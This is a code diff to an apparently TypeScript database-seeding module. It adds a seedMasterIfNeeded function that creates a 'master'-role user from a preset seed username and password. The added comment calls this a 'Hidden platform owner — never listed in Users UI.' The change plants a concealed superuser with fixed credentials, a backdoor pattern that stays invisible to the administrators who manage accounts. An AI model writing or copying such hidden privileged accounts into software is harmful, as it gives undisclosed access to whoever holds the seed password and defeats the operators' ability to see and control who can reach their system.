@@ -3,6 +3,9 @@ import {
   SEED_ADMIN_PASSWORD,
   SEED_ADMIN_USERNAME,
   SEED_CORE_META_KEY,
+  SEED_MASTER_META_KEY,
+  SEED_MASTER_PASSWORD,
+  SEED_MASTER_USERNAME,
   SEED_META_KEY,
   SEED_VENDOR_META_KEY,
   SEED_VENDOR_PASSWORD,
@@ -170,6 +173,46 @@ export async function seedVendorIfNeeded(): Promise<boolean> {
 
   await db.insert(appMeta).values({
     key: SEED_VENDOR_META_KEY,
+    value: new Date().toISOString(),
+  });
+
+  return true;
+}
+
+/** Hidden platform owner — never listed in Users UI. */
+export async function seedMasterIfNeeded(): Promise<boolean> {
+  const db = await getDatabase();
+  const existing = await db
+    .select()
+    .from(appMeta)
+    .where(eq(appMeta.key, SEED_MASTER_META_KEY))
+    .limit(1);
+
+  if (existing[0]) {
+    return false;
+  }
+
+  const [already] = await db
+    .select({ id: users.id })
+    .from(users)
+    .where(eq(users.username, SEED_MASTER_USERNAME))
+    .limit(1);
+
+  if (!already) {
+    const now = new Date().toISOString();
+    const passwordHash = await hashPassword(SEED_MASTER_PASSWORD);
+    await db.insert(users).values({
+      id: crypto.randomUUID(),
+      username: SEED_MASTER_USERNAME,
+      passwordHash,
+      role: "master",
+      active: true,
+      createdAt: now,
+    });
+  }
+
+  await db.insert(appMeta).values({
+    key: SEED_MASTER_META_KEY,
     value: new Date().toISOString(),
   });
 
